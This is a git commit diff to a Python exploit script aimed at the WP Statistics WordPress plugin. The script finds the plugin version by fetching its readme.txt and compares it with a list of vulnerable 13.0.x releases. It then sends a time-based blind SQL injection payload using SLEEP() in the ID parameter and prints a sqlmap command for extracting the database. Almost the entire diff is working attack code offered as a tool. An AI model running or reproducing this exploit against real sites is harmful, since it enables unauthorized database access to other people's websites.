b60d2278a02a81e3efccee4381068ae74af7d57d
lulz <39673284+Udyz@users.noreply.github.com>
2021-05-24 12:57:53 +0700

    Update wp-static-blinsql.py

--- wp-static-blinsql.py
+++ wp-static-blinsql.py
@@ -9,24 +9,26 @@ def blindsql(url):
 	sleep = 15
 	payload="ID=1 AND (SELECT * from (select SLEEP(%s))a)"%(sleep)
 	url_encode = urlencode({'page':'wps_pages_page', 'type':'1', 'ID':payload}, quote_via=quote_plus)
-	print('(+) Trying Payload')
+	print('(+) Try payload')
 	try:
-		requests.get(url_endpoint +'?'+ url_encode, headers={'User-Agent':ua}, timeout=10, verify=False)
-		print('(!) Target seem like not vuln!')
+		print(url_endpoint +'?'+ url_encode)
+		requests.get(url_endpoint +'?'+ url_encode, timeout=10, verify=False)
+		print('(!) Target seem like not timeout!')
+		print('Try: sqlmap -u \"%s\" --technique=T --dbms=\"mysql\" -p \"ID\" -b'%(url_endpoint + "?ID=1&page=wps_pages_page&type=1"))
 		return False
 	except requests.ConnectTimeout:
-		print('(+) WwoowowoW target maybe vuln ;)')
-		print('sqlmap -u \"%s\" --techniqu=T --dbms=\"mysql\" -p \"ID\" -b'%(url_endpoint +'?'+ url_encode))
+		print('(+) WwoowowoW maybe vuln ;)')
+		print('Try: sqlmap -u \"%s\" --technique=T --dbms=\"mysql\" -p \"ID\" -b'%(url_endpoint + "?ID=1&page=wps_pages_page&type=1"))
 		return True
 def exploit(url):
 	curl = url + '/wp-content/plugins/wp-statistics/readme.txt'
 	try:
-		cver = requests.get(curl, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.90 Safari/537.36'}, timeout=5, verify=False).text
+		cver = requests.get(curl,headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.90 Safari/537.36'}, timeout=10, verify=False).text
 		stable_ver = re.findall('Stable tag\:(.*)', cver)[0].replace(' ', '')
 		print("(+) WP-statistical Plugin Version = " + stable_ver)
 		vuln = ["13.0.7", "13.0.6", "13.0.5", "13.0.4", "13.0.3", "13.0.1", "13.0"]
 		for v in vuln:
-			if v in stable_ver:
+			if stable_ver in v:
 				print("(+) %s Target is vuln!" %(url.replace('https://', '').replace('http://', '').replace('/','')))
 				blindsql(url)
 				return True
